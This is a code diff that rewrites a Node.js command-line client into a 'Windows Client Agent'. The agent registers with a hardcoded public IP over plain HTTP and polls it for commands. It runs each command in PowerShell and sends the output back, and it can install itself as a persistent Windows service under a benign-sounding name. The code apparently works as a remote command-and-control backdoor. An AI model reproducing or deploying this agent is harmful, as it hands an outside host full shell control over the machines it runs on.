@@ -1,37 +1,444 @@
 #!/usr/bin/env node
 
-// client.js - Direct client for backend at 45.131.109.191
+// client-agent/client.js - Windows Client Agent
 const http = require('http');
-const readline = require('readline');
+const https = require('https');
+const { exec, spawn } = require('child_process');
+const os = require('os');
+const fs = require('fs');
+const path = require('path');
+const crypto = require('crypto');
+const { v4: uuidv4 } = require('uuid');
 
-// Server configuration - hardcoded for your backend
-const SERVER_IP = '45.131.109.191';
-const SERVER_PORT = 80;
-const SERVER_URL = `http://${SERVER_IP}:${SERVER_PORT}`;
-
-class BackendClient {
+class WindowsClientAgent {
     constructor() {
-        this.serverIP = SERVER_IP;
-        this.serverPort = SERVER_PORT;
-        this.token = null;
+        this.config = this.loadConfig();
+        this.clientId = this.config.clientId || this.generateClientId();
+        this.hostname = os.hostname();
+        this.isRunning = false;
+        this.heartbeatInterval = null;
+        this.commandQueue = [];
+        this.activeCommands = new Map();
+        
+        // Save client ID if generated
+        if (!this.config.clientId) {
+            this.config.clientId = this.clientId;
+            this.saveConfig();
+        }
+
+        this.setupLogging();
+        this.log('info', `Client agent initialized: ${this.hostname} (${this.clientId})`);
     }
 
-    // Helper method to make HTTP requests
-    async request(method, path, data = null) {
+    loadConfig() {
+        try {
+            const configPath = path.join(__dirname, 'config.json');
+            if (fs.existsSync(configPath)) {
+                return JSON.parse(fs.readFileSync(configPath, 'utf8'));
+            }
+        } catch (error) {
+            console.error('Failed to load config:', error.message);
+        }
+
+        // Default configuration
+        return {
+            mainServer: {
+                host: '45.131.109.191',
+                port: 80,
+                protocol: 'http'
+            },
+            authentication: {
+                clientSecret: crypto.randomBytes(32).toString('hex')
+            },
+            settings: {
+                heartbeatInterval: 30000,      // 30 seconds
+                commandTimeout: 300000,       // 5 minutes
+                maxConcurrentCommands: 3,
+                logLevel: 'info',
+                autoReconnect: true,
+                reconnectDelay: 5000
+            }
+        };
+    }
+
+    saveConfig() {
+        try {
+            const configPath = path.join(__dirname, 'config.json');
+            fs.writeFileSync(configPath, JSON.stringify(this.config, null, 2));
+        } catch (error) {
+            console.error('Failed to save config:', error.message);
+        }
+    }
+
+    generateClientId() {
+        return `${this.hostname}-${crypto.randomBytes(8).toString('hex')}`.toLowerCase();
+    }
+
+    setupLogging() {
+        const logDir = path.join(__dirname, 'logs');
+        if (!fs.existsSync(logDir)) {
+            fs.mkdirSync(logDir, { recursive: true });
+        }
+
+        this.logFile = path.join(logDir, 'client.log');
+        this.commandLogFile = path.join(logDir, 'commands.log');
+    }
+
+    log(level, message, metadata = {}) {
+        const timestamp = new Date().toISOString();
+        const logEntry = {
+            timestamp,
+            level: level.toUpperCase(),
+            clientId: this.clientId,
+            hostname: this.hostname,
+            message,
+            ...metadata
+        };
+
+        const logLine = JSON.stringify(logEntry) + '\n';
+        
+        // Write to local log file
+        try {
+            fs.appendFileSync(this.logFile, logLine);
+        } catch (error) {
+            console.error('Failed to write to log file:', error.message);
+        }
+
+        // Console output
+        console.log(`[${timestamp}] ${level.toUpperCase()}: ${message}`);
+
+        // Send to main server (async, don't wait)
+        this.sendLogToServer(logEntry).catch(err => {
+            // Silently handle log forwarding failures to avoid loops
+        });
+    }
+
+    logCommand(commandId, command, result, metadata = {}) {
+        const logEntry = {
+            timestamp: new Date().toISOString(),
+            type: 'COMMAND_EXECUTION',
+            commandId,
+            clientId: this.clientId,
+            hostname: this.hostname,
+            command: command.length > 200 ? command.substring(0, 200) + '...' : command,
+            success: result.success,
+            exitCode: result.exitCode,
+            executionTime: result.executionTime,
+            outputSize: (result.stdout?.length || 0) + (result.stderr?.length || 0),
+            ...metadata
+        };
+
+        const logLine = JSON.stringify(logEntry) + '\n';
+        
+        try {
+            fs.appendFileSync(this.commandLogFile, logLine);
+        } catch (error) {
+            console.error('Failed to write command log:', error.message);
+        }
+    }
+
+    async start() {
+        if (this.isRunning) {
+            this.log('warn', 'Client agent already running');
+            return;
+        }
+
+        this.log('info', 'Starting Windows Client Agent...');
+        
+        try {
+            // Register with main server
+            await this.registerWithServer();
+            
+            // Start heartbeat
+            this.startHeartbeat();
+            
+            // Start command polling
+            this.startCommandPolling();
+            
+            this.isRunning = true;
+            this.log('info', 'Client agent started successfully');
+            
+        } catch (error) {
+            this.log('error', 'Failed to start client agent', { error: error.message });
+            throw error;
+        }
+    }
+
+    async stop() {
+        if (!this.isRunning) return;
+
+        this.log('info', 'Stopping Windows Client Agent...');
+        
+        this.isRunning = false;
+        
+        if (this.heartbeatInterval) {
+            clearInterval(this.heartbeatInterval);
+        }
+        
+        if (this.pollingInterval) {
+            clearInterval(this.pollingInterval);
+        }
+
+        // Cancel active commands
+        for (const [commandId, process] of this.activeCommands) {
+            try {
+                process.kill('SIGTERM');
+                this.log('info', `Terminated command: ${commandId}`);
+            } catch (error) {
+                this.log('error', `Failed to terminate command ${commandId}`, { error: error.message });
+            }
+        }
+
+        // Unregister from server
+        try {
+            await this.unregisterFromServer();
+        } catch (error) {
+            this.log('error', 'Failed to unregister from server', { error: error.message });
+        }
+
+        this.log('info', 'Client agent stopped');
+    }
+
+    async registerWithServer() {
+        const registrationData = {
+            clientId: this.clientId,
+            hostname: this.hostname,
+            platform: os.platform(),
+            arch: os.arch(),
+            version: process.version,
+            capabilities: ['command_execution', 'file_operations', 'system_info'],
+            clientSecret: this.config.authentication.clientSecret
+        };
+
+        const response = await this.makeRequest('POST', '/api/clients/register', registrationData);
+        
+        if (!response.success) {
+            throw new Error(`Registration failed: ${response.error}`);
+        }
+
+        this.serverToken = response.token;
+        this.log('info', 'Successfully registered with main server');
+    }
+
+    async unregisterFromServer() {
+        await this.makeRequest('POST', '/api/clients/unregister', {
+            clientId: this.clientId
+        });
+        
+        this.log('info', 'Unregistered from main server');
+    }
+
+    startHeartbeat() {
+        this.heartbeatInterval = setInterval(async () => {
+            try {
+                await this.sendHeartbeat();
+            } catch (error) {
+                this.log('error', 'Heartbeat failed', { error: error.message });
+                
+                if (this.config.settings.autoReconnect) {
+                    this.scheduleReconnect();
+                }
+            }
+        }, this.config.settings.heartbeatInterval);
+    }
+
+    async sendHeartbeat() {
+        const heartbeatData = {
+            clientId: this.clientId,
+            timestamp: new Date().toISOString(),
+            status: 'healthy',
+            systemInfo: this.getSystemInfo(),
+            activeCommands: this.activeCommands.size,
+            queuedCommands: this.commandQueue.length
+        };
+
+        await this.makeRequest('POST', '/api/clients/heartbeat', heartbeatData);
+    }
+
+    startCommandPolling() {
+        this.pollingInterval = setInterval(async () => {
+            try {
+                await this.pollForCommands();
+            } catch (error) {
+                this.log('error', 'Command polling failed', { error: error.message });
+            }
+        }, 5000); // Poll every 5 seconds
+    }
+
+    async pollForCommands() {
+        const response = await this.makeRequest('GET', `/api/clients/${this.clientId}/commands`);
+        
+        if (response.commands && response.commands.length > 0) {
+            for (const command of response.commands) {
+                this.commandQueue.push(command);
+                this.log('info', `Received command: ${command.id}`);
+            }
+            
+            this.processCommandQueue();
+        }
+    }
+
+    async processCommandQueue() {
+        while (this.commandQueue.length > 0 && this.activeCommands.size < this.config.settings.maxConcurrentCommands) {
+            const command = this.commandQueue.shift();
+            this.executeCommand(command);
+        }
+    }
+
+    async executeCommand(command) {
+        const { id, command: cmd, timeout, metadata } = command;
+        const startTime = Date.now();
+
+        this.log('info', `Executing command: ${id}`, { command: cmd });
+
+        try {
+            // Acknowledge command receipt
+            await this.makeRequest('POST', `/api/clients/${this.clientId}/commands/${id}/ack`);
+
+            const result = await this.runCommand(cmd, timeout || this.config.settings.commandTimeout);
+            const executionTime = Date.now() - startTime;
+
+            result.executionTime = executionTime;
+            result.commandId = id;
+            result.clientId = this.clientId;
+
+            // Log command execution
+            this.logCommand(id, cmd, result, metadata);
+
+            // Send result back to server
+            await this.makeRequest('POST', `/api/clients/${this.clientId}/commands/${id}/result`, {
+                result,
+                metadata: {
+                    ...metadata,
+                    executionTime,
+                    hostname: this.hostname
+                }
+            });
+
+            this.log('info', `Command completed: ${id}`, { 
+                success: result.success, 
+                executionTime 
+            });
+
+        } catch (error) {
+            const executionTime = Date.now() - startTime;
+            this.log('error', `Command failed: ${id}`, { 
+                error: error.message, 
+                executionTime 
+            });
+
+            // Send error result
+            try {
+                await this.makeRequest('POST', `/api/clients/${this.clientId}/commands/${id}/result`, {
+                    result: {
+                        success: false,
+                        error: error.message,
+                        exitCode: -1,
+                        executionTime
+                    }
+                });
+            } catch (reportError) {
+                this.log('error', `Failed to report command error: ${reportError.message}`);
+            }
+        }
+    }
+
+    async runCommand(command, timeout) {
+        return new Promise((resolve, reject) => {
+            const startTime = Date.now();
+            let stdout = '';
+            let stderr = '';
+
+            // Use appropriate shell for Windows
+            const shell = process.platform === 'win32' ? 'powershell.exe' : '/bin/bash';
+            const args = process.platform === 'win32' ? ['-Command', command] : ['-c', command];
+
+            const childProcess = spawn(shell, args, {
+                timeout,
+                stdio: ['pipe', 'pipe', 'pipe'],
+                shell: false
+            });
+
+            this.activeCommands.set(command, childProcess);
+
+            childProcess.stdout.on('data', (data) => {
+                stdout += data.toString();
+            });
+
+            childProcess.stderr.on('data', (data) => {
+                stderr += data.toString();
+            });
+
+            childProcess.on('close', (code) => {
+                this.activeCommands.delete(command);
+                
+                resolve({
+                    success: code === 0,
+                    exitCode: code,
+                    stdout: stdout,
+                    stderr: stderr,
+                    executionTime: Date.now() - startTime
+                });
+            });
+
+            childProcess.on('error', (error) => {
+                this.activeCommands.delete(command);
+                reject(error);
+            });
+
+            // Handle timeout
+            setTimeout(() => {
+                if (this.activeCommands.has(command)) {
+                    childProcess.kill('SIGTERM');
+                    this.activeCommands.delete(command);
+                    reject(new Error(`Command timeout after ${timeout}ms`));
+                }
+            }, timeout);
+        });
+    }
+
+    getSystemInfo() {
+        return {
+            hostname: os.hostname(),
+            platform: os.platform(),
+            arch: os.arch(),
+            release: os.release(),
+            uptime: os.uptime(),
+            loadavg: os.loadavg(),
+            totalmem: os.totalmem(),
+            freemem: os.freemem(),
+            cpus: os.cpus().length,
+            nodeVersion: process.version
+        };
+    }
+
+    async sendLogToServer(logEntry) {
+        try {
+            await this.makeRequest('POST', '/api/clients/logs', {
+                clientId: this.clientId,
+                logs: [logEntry]
+            });
+        } catch (error) {
+            // Silently fail to avoid logging loops
+        }
+    }
+
+    async makeRequest(method, path, data = null) {
         const options = {
-            hostname: this.serverIP,
-            port: this.serverPort,
+            hostname: this.config.mainServer.host,
+            port: this.config.mainServer.port,
             path: path,
             method: method,
             headers: {
                 'Content-Type': 'application/json',
-                'Accept': 'application/json'
+                'User-Agent': `WindowsClientAgent/${this.clientId}`,
+                'X-Client-ID': this.clientId
             },
-            timeout: 30000
+            timeout: 10000
         };
 
-        if (this.token) {
-            options.headers['Authorization'] = `Bearer ${this.token}`;
+        if (this.serverToken) {
+            options.headers['Authorization'] = `Bearer ${this.serverToken}`;
         }
 
         const body = data ? JSON.stringify(data) : null;
@@ -40,7 +447,9 @@ class BackendClient {
         }
 
         return new Promise((resolve, reject) => {
-            const req = http.request(options, (res) => {
+            const protocol = this.config.mainServer.protocol === 'https' ? https : http;
+            
+            const req = protocol.request(options, (res) => {
                 let responseData = '';
 
                 res.on('data', (chunk) => {
@@ -53,35 +462,22 @@ class BackendClient {
                         if (res.statusCode >= 200 && res.statusCode < 300) {
                             resolve(parsedData);
                         } else {
-                            reject({
-                                status: res.statusCode,
-                                error: parsedData.error || `HTTP ${res.statusCode}`,
-                                data: parsedData
-                            });
+                            reject(new Error(parsedData.error || `HTTP ${res.statusCode}`));
                         }
                     } catch (e) {
                         if (res.statusCode >= 200 && res.statusCode < 300) {
-                            resolve(responseData);
+                            resolve({ data: responseData });
                         } else {
-                            reject({ status: res.statusCode, error: responseData });
+                            reject(new Error(`HTTP ${res.statusCode}: ${responseData}`));
                         }
                     }
                 });
             });
 
-            req.on('error', (error) => {
-                if (error.code === 'ECONNREFUSED') {
-                    reject({ error: `Cannot connect to server at ${this.serverIP}:${this.serverPort}` });
-                } else if (error.code === 'ETIMEDOUT') {
-                    reject({ error: 'Connection timeout' });
-                } else {
-                    reject({ error: error.message });
-                }
-            });
-
+            req.on('error', reject);
             req.on('timeout', () => {
                 req.destroy();
-                reject({ error: 'Request timeout (30s)' });
+                reject(new Error('Request timeout'));
             });
 
             if (body) {
@@ -91,349 +487,92 @@ class BackendClient {
         });
     }
 
-    // Authentication
-    async login(username, password) {
-        try {
-            console.log(`\nConnecting to ${SERVER_URL}...`);
-            const response = await this.request('POST', '/api/auth/login', {
-                username,
-                password
-            });
+    scheduleReconnect() {
+        if (this.reconnectTimeout) return;
+        
+        this.log('info', `Scheduling reconnect in ${this.config.settings.reconnectDelay}ms`);
+        
+        this.reconnectTimeout = setTimeout(async () => {
+            this.reconnectTimeout = null;
             
-            this.token = response.token;
-            console.log('✓ Login successful');
-            console.log(`  Token expires in: ${response.expiresIn} seconds`);
-            return response;
-        } catch (error) {
-            console.error('✗ Login failed:', error.error || error.message);
-            throw error;
-        }
-    }
-
-    // Execute command
-    async executeCommand(command) {
-        try {
-            const response = await this.request('POST', '/api/execute', { command });
-            
-            console.log('✓ Command executed');
-            console.log('  ID:', response.commandId);
-            console.log('  Time:', response.executionTime + 'ms');
-            
-            if (response.stdout) {
-                console.log('\n--- Output ---');
-                console.log(response.stdout);
-                if (!response.stdout.endsWith('\n')) console.log('');
+            try {
+                await this.registerWithServer();
+                this.log('info', 'Reconnected to main server');
+            } catch (error) {
+                this.log('error', 'Reconnection failed', { error: error.message });
+                this.scheduleReconnect();
             }
-            
-            if (response.stderr) {
-                console.log('\n--- Errors ---');
-                console.log(response.stderr);
-            }
-            
-            return response;
-        } catch (error) {
-            console.error('✗ Command failed:', error.error || error.message);
-            throw error;
-        }
-    }
-
-    // Get system information
-    async getSystemInfo() {
-        try {
-            const response = await this.request('GET', '/api/system/info');
-            return response;
-        } catch (error) {
-            console.error('✗ Failed to get system info:', error.error || error.message);
-            throw error;
-        }
-    }
-
-    // Get logs
-    async getLogs(type = 'combined', lines = 50) {
-        try {
-            const response = await this.request('GET', `/api/logs?type=${type}&lines=${lines}`);
-            return response;
-        } catch (error) {
-            console.error('✗ Failed to get logs:', error.error || error.message);
-            throw error;
-        }
-    }
-
-    // Get process list
-    async getProcesses() {
-        try {
-            const response = await this.request('GET', '/api/processes');
-            return response;
-        } catch (error) {
-            console.error('✗ Failed to get processes:', error.error || error.message);
-            throw error;
-        }
-    }
-
-    // Get network connections
-    async getNetworkConnections() {
-        try {
-            const response = await this.request('GET', '/api/network/connections');
-            return response;
-        } catch (error) {
-            console.error('✗ Failed to get network connections:', error.error || error.message);
-            throw error;
-        }
-    }
-
-    // Health check
-    async healthCheck() {
-        try {
-            const response = await this.request('GET', '/api/health');
-            console.log('✓ Server is healthy');
-            console.log('  Status:', response.status);
-            console.log('  Uptime:', Math.floor(response.uptime / 60), 'minutes');
-            return response;
-        } catch (error) {
-            console.error('✗ Server unreachable:', error.error || error.message);
-            throw error;
-        }
+        }, this.config.settings.reconnectDelay);
     }
 }
 
-// Interactive CLI
-async function startCLI() {
-    const rl = readline.createInterface({
-        input: process.stdin,
-        output: process.stdout,
-        prompt: 'backend> '
-    });
-
-    const client = new BackendClient();
-    
-    console.log('==================');
-    console.log('  Backend Client  ');
-    console.log('==================');
-    console.log('Type "help" for commands\n');
-    
-    // Check server connection
-    console.log('Checking server connection...');
-    try {
-        await client.healthCheck();
-        console.log('');
-    } catch (error) {
-        console.error('\n⚠ Warning: Server may be unreachable\n');
-    }
-
-    // Login
-    console.log('Please login to the backend:');
-    const username = await new Promise(resolve => {
-        rl.question('Username: ', resolve);
-    });
-    
-    // Hide password
-    const password = await new Promise(resolve => {
-        rl.question('Password: ', (answer) => {
-            console.log('');
-            resolve(answer);
+// Service management for Windows
+class WindowsService {
+    static install() {
+        const Service = require('node-windows').Service;
+        
+        const svc = new Service({
+            name: 'SecureBackendClient',
+            description: 'Secure Backend Framework - Windows Client Agent',
+            script: path.join(__dirname, 'client.js'),
+            nodeOptions: [
+                '--harmony',
+                '--max_old_space_size=4096'
+            ]
         });
-        rl.stdoutMuted = true;
-        rl._writeToOutput = function _writeToOutput(stringToWrite) {
-            if (!rl.stdoutMuted)
-                rl.output.write(stringToWrite);
-        };
-    });
-    rl.stdoutMuted = false;
-    
-    try {
-        await client.login(username, password);
-        console.log('\n✓ Connected to backend\n');
-    } catch (error) {
-        console.error('\n✗ Authentication failed');
-        console.error('Check your credentials and try again.\n');
-        process.exit(1);
-    }
-    
-    // Command handlers
-    const commands = {
-        help: () => {
-            console.log('\nCommands:');
-            console.log('  exec <cmd>   - Execute command on server');
-            console.log('  sys          - Show system information');
-            console.log('  ps           - Show running processes');
-            console.log('  net          - Show network connections');
-            console.log('  logs [type]  - Show logs (combined/error/security/audit)');
-            console.log('  health       - Check server health');
-            console.log('  clear        - Clear screen');
-            console.log('  exit         - Disconnect and exit\n');
-        }
-    };
-    
-    // Main command loop
-    rl.prompt();
-    
-    rl.on('line', async (line) => {
-        const [cmd, ...args] = line.trim().split(' ');
-        
-        try {
-            switch (cmd) {
-                case 'help':
-                case '?':
-                    commands.help();
-                    break;
-                    
-                case 'clear':
-                case 'cls':
-                    console.clear();
-                    console.log('Backend Client - Connected to', SERVER_IP);
-                    break;
-                    
-                case 'exec':
-                case 'run':
-                    if (args.length === 0) {
-                        console.log('Usage: exec <command>');
-                    } else {
-                        await client.executeCommand(args.join(' '));
-                    }
-                    break;
-                    
-                case 'sys':
-                case 'sysinfo':
-                case 'system':
-                    const sysInfo = await client.getSystemInfo();
-                    console.log('\n=== System Information ===');
-                    console.log(sysInfo.uptime);
-                    console.log('Load:', sysInfo.load);
-                    console.log('\nMemory:');
-                    console.log(sysInfo.memory);
-                    console.log('\nDisk Usage:');
-                    console.log(sysInfo.disk);
-                    break;
-                    
-                case 'ps':
-                case 'processes':
-                case 'proc':
-                    const procs = await client.getProcesses();
-                    console.log('\n=== Top Processes (by CPU) ===');
-                    console.log('PID      USER         CPU   MEM   COMMAND');
-                    console.log('-'.repeat(60));
-                    procs.processes.slice(0, 15).forEach(p => {
-                        const cmd = p.command.length > 35 ? p.command.substring(0, 32) + '...' : p.command;
-                        console.log(
-                            p.pid.toString().padEnd(8),
-                            p.user.substring(0, 12).padEnd(12),
-                            (p.cpu + '%').padEnd(6),
-                            (p.mem + '%').padEnd(6),
-                            cmd
-                        );
-                    });
-                    console.log('');
-                    break;
-                    
-                case 'net':
-                case 'network':
-                case 'netstat':
-                    const net = await client.getNetworkConnections();
-                    console.log('\n=== Network Connections ===');
-                    console.log(net.connections);
-                    break;
-                    
-                case 'logs':
-                case 'log':
-                    const logType = args[0] || 'combined';
-                    const validTypes = ['combined', 'error', 'security', 'audit'];
-                    
-                    if (!validTypes.includes(logType)) {
-                        console.log('Valid log types: combined, error, security, audit');
-                    } else {
-                        const logs = await client.getLogs(logType, 25);
-                        console.log(`\n=== ${logType.toUpperCase()} Logs (last 25) ===`);
-                        logs.lines.forEach(line => {
-                            if (typeof line === 'string') {
-                                console.log(line);
-                            } else {
-                                console.log(JSON.stringify(line));
-                            }
-                        });
-                        console.log('');
-                    }
-                    break;
-                    
-                case 'health':
-                case 'status':
-                    await client.healthCheck();
-                    break;
-                    
-                case 'exit':
-                case 'quit':
-                case 'q':
-                    console.log('\nDisconnecting from backend...');
-                    rl.close();
-                    process.exit(0);
-                    break;
-                    
-                case '':
-                    // Empty line, just show prompt again
-                    break;
-                    
-                default:
-                    console.log(`Unknown command: ${cmd}`);
-                    console.log('Type "help" for available commands');
-            }
-        } catch (error) {
-            console.error('Error:', error.error || error.message);
-        }
-        
-        rl.prompt();
-    });
-    
-    rl.on('close', () => {
-        console.log('\nConnection closed');
-        process.exit(0);
-    });
-}
 
-// Quick test mode
-async function quickTest(username, password) {
-    const client = new BackendClient();
-    
-    console.log(`Testing connection to ${SERVER_URL}...`);
-    
-    try {
-        // Test health
-        await client.healthCheck();
+        svc.on('install', () => {
+            console.log('Service installed successfully');
+            svc.start();
+        });
+
+        svc.install();
+    }
+
+    static uninstall() {
+        const Service = require('node-windows').Service;
         
-        // Test login
-        await client.login(username, password);
-        
-        // Test command execution
-        console.log('\nTesting command execution...');
-        await client.executeCommand('whoami');
-        await client.executeCommand('pwd');
-        
-        console.log('\n✓ All tests passed!');
-        console.log('Backend is fully operational.\n');
-        
-    } catch (error) {
-        console.error('\n✗ Test failed:', error.error || error.message);
-        process.exit(1);
+        const svc = new Service({
+            name: 'SecureBackendClient',
+            script: path.join(__dirname, 'client.js')
+        });
+
+        svc.on('uninstall', () => {
+            console.log('Service uninstalled successfully');
+        });
+
+        svc.uninstall();
     }
 }
 
-// Main
+// Main execution
 if (require.main === module) {
     const args = process.argv.slice(2);
     
-    console.log('Backend Client - Direct connection to 45.131.109.191\n');
-    
-    if (args.length === 0) {
-        // Default: start interactive CLI
-        startCLI();
-    } else if (args[0] === 'test' && args.length === 3) {
-        // Test mode: node client.js test username password
-        quickTest(args[1], args[2]);
+    if (args[0] === 'install-service') {
+        WindowsService.install();
+    } else if (args[0] === 'uninstall-service') {
+        WindowsService.uninstall();
     } else {
-        console.log('Usage:');
-        console.log('  node client.js                    # Interactive mode');
-        console.log('  node client.js test user pass     # Quick test\n');
-        console.log('Server: 45.131.109.191:80');
-        process.exit(0);
+        const agent = new WindowsClientAgent();
+        
+        // Graceful shutdown handling
+        const shutdown = async () => {
+            console.log('\nShutting down client agent...');
+            await agent.stop();
+            process.exit(0);
+        };
+
+        process.on('SIGINT', shutdown);
+        process.on('SIGTERM', shutdown);
+        process.on('SIGHUP', shutdown);
+
+        // Start the agent
+        agent.start().catch(error => {
+            console.error('Failed to start client agent:', error.message);
+            process.exit(1);
+        });
     }
 }
 
-module.exports = BackendClient;
+module.exports = WindowsClientAgent;
